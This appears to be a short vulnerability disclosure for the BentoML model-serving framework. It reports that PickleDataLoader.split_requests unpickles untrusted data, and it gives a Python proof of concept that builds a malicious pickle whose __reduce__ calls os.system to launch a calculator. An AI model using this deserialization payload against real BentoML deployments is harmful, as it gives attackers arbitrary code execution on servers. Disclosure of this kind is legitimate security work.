# Description
BentoML is a framework for serving, managing, and deploying machine learning models. It is aiming to bridge the gap between Data Science and DevOps, and enable teams to deliver prediction services in a fast, repeatable, and scalable way.
* **Vulnerability discription**
    untrusded loading of data by the picle.load function leading to Arbitrary code execution.
# Proof of Concept

1. run exploit.py
```python
// exploit.py
import os
import pickle
#setup
os.system('pip install bentoml')
from bentoml.marshal.utils import PickleDataLoader
#payload formation
class ArbitrarcyCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#serilizing payload
dumps = pickle.dumps(ArbitrarcyCode())
#exploiting bentoml
PickleDataLoader.split_requests(dumps)
```
![](https://media.discordapp.net/attachments/789769803770494996/789769887107121192/Screenshot_from_2020-12-19_07-40-24.png)
